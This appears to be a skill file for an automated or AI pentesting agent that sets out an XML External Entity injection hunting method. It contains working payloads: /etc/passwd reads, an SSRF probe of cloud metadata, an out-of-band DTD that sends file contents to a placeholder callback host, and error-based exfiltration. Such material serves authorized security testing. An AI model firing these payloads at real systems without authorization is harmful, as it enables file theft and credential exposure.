---
name: hunt-xxe
description: Hunting skill for XML External Entity (XXE) injection — classic in-band file-read via `<!ENTITY>`, blind/OOB XXE via parameter entities and an external DTD, SOAP services, and upload-based XXE in SVG/DOCX/XLSX (Office Open XML is a zip of XML internally). Use on any endpoint accepting raw XML, SOAP services, SVG/image upload parsed server-side, Office-document upload/export, or a legacy XML-import fallback.
---

# XML External Entity (XXE) Injection Hunting Methodology

XXE happens when an XML parser resolves externally-defined entities inside attacker-controlled XML, turning a DOCTYPE declaration into a read primitive (local file disclosure), an SSRF primitive (a `SYSTEM` identifier is itself a URL the parser fetches), or, in older or misconfigured parsers, a denial-of-service primitive (entity expansion). Many stacks accept XML in more places than the obvious API body — SOAP endpoints, SVG and Office-document uploads, and legacy "import from XML" fallbacks on otherwise-JSON APIs are all live XML parsers worth testing independently.

## When to invoke

- Any endpoint whose request accepts `Content-Type: application/xml` or `text/xml`, or whose body starts with `<?xml`.
- SOAP services — the entire protocol is XML-native; every SOAP operation is a candidate injection point via the envelope's DOCTYPE.
- SVG or other image upload that is parsed/rasterized server-side (thumbnailing, format conversion) rather than served byte-for-byte.
- Office-document upload, export, or import features (DOCX, XLSX, PPTX) — Office Open XML files are a zip archive of XML parts, and any server-side step that opens and parses them (preview generation, text extraction, template merge) is a parser to target.
- A JSON-first API that still exposes a legacy "import from XML" or "bulk upload (XML)" fallback endpoint.

## Technique ladder: in-band first, escalate to OOB if the parser is hardened

### 1. Classic in-band entity read

Declare an internal DTD subset with a general entity pointing at a local file, then reference that entity somewhere the response reflects it:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

If the application echoes any part of the submitted XML back (confirmation pages, validation errors, generated PDFs/documents, search-indexed content), the entity's resolved file content appears in that reflection. The same `SYSTEM` identifier can carry an internal URL instead of a `file://` path, turning this into XXE-driven SSRF (`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`) — treat `hunt-ssrf`'s crown-jewel target list as the candidate set once a parser accepts an external `SYSTEM` fetch.

### 2. If the internal subset is rejected, escalate to OOB via parameter entities

A common hardening disables `DOCTYPE`/internal-subset declarations outright, or forbids external general entities while still resolving **parameter** entities and external DTDs. When the classic payload above is rejected or silently stripped, switch to a parameter-entity-driven external DTD — this is the same callback-based confirmation pattern `hunt-ssrf` uses for blind SSRF, since both rely on triggering an outbound request from the target to prove the injection landed.

Host an external DTD on infrastructure you control (or use `oob-probe`'s collaborator payload as the host), containing:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-CALLBACK-HOST/?x=%file;'>">
%eval;
%exfil;
```

The `&#x25;` encodes a literal `%` inside `%eval`'s replacement text — it has to be escaped there because a bare `%` would be parsed as a parameter-entity reference at declaration time, before `%file` has been substituted in; encoding it defers that parse until `%eval;` is actually expanded, at which point the now-literal `%exfil` declaration is parsed for real, with the file's content already spliced into its `SYSTEM` URL. This only works from an *external* DTD — parameter-entity references inside a markup declaration's value are disallowed in the internal subset, which is also why step 2 is only reachable once step 1's internal-subset payload gets rejected.

Reference the external DTD from the main document:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-CALLBACK-HOST/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

A hit on your callback host — an inbound request carrying the file's content in the query string — is the proof. If `oob-probe` is available, use its Burp Collaborator payload as `YOUR-CALLBACK-HOST` and read the interaction back from it, exactly as `hunt-ssrf` does for blind confirmation. Otherwise, host the DTD and a simple logging HTTP listener yourself and record the interaction as `inferred` if no callback infrastructure is reachable.

### 3. Error-based exfiltration when neither reflection nor a callback is available

Some environments block all outbound traffic from the parser (egress-filtered) but still return raw parser errors to the client. Force a parse failure whose error message embeds the file content, by pointing the exfiltration entity at a path that cannot exist:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/<contents-of-/etc/hostname>`, fails because that path doesn't exist, and many parsers (notably libxml2-based stacks) include the invalid path — file content and all — in the exception message surfaced to the client. This needs no outbound network access at all, only a verbose error response.

### SOAP services

Treat every SOAP operation as its own injection point: the envelope is XML end to end, so the same DOCTYPE/entity payloads above go in place of (or alongside) the legitimate envelope. SOAP stacks often have their own XML parser configuration distinct from the main web framework's, so a hardened REST/JSON XML-import endpoint on the same host doesn't imply the SOAP endpoint is hardened too — test both.

### SVG and Office Open XML (DOCX/XLSX) upload

- **SVG**: it's XML. Embed the DOCTYPE/entity declaration in the SVG's prolog and reference the entity inside a `<text>` or `<desc>` element; if the server rasterizes the SVG (thumbnail, format conversion) rather than serving it inline, a reflected entity can surface in the rendered output, and an external `SYSTEM` fetch confirms OOB the same way as above.
- **DOCX/XLSX/PPTX**: unzip the file, inject the entity declaration into one of the internal XML parts most likely to be parsed first (`word/document.xml`, `xl/workbook.xml`, `[Content_Types].xml`), re-zip, and upload. Any server-side step that opens the document — text extraction, preview/thumbnail rendering, template merge/mail-merge — is a candidate parser; these often use a different, sometimes less-hardened XML library than the application's primary request parser.

## Depth floor

Do not report this surface exhausted until you have tried **at least 25 distinct technique/target combinations** — in-band vs. OOB vs. error-based entity forms, crossed against each target-file path (`/etc/passwd`, `/etc/hostname`, app config paths, cloud-metadata URLs) and each surface found (raw XML body, SOAP envelope, SVG upload, DOCX/XLSX upload, legacy XML-import fallback). Record every negative result (DOCTYPE stripped, external entities disabled, no callback) as a `record_fact`.

## Evidence gate

Before `report_finding`:
- For in-band XXE: the exact payload submitted and the response showing the target file's **actual content** reflected back — not just an error naming the file.
- For blind/OOB XXE: the external DTD payload and the captured callback interaction (DNS/HTTP hit on your listener or `oob-probe`'s collaborator, carrying the exfiltrated content in the request).
- For error-based XXE: the payload and the parser error response showing the file content embedded in the error text.
- Note which entity-resolution hardening was present or absent (internal subset allowed/blocked, external general entities allowed/blocked, parameter entities allowed/blocked) — this classifies which rung of the ladder worked.
- Tag the finding `vulnclass: XXE` and bind `traffic_refs`.

## Stop-authority

This skill decides *what XXE vectors to try* and *how to verify*. It never decides when the entire vulnerability class is exhausted — that stays with `hunting-methodology`.
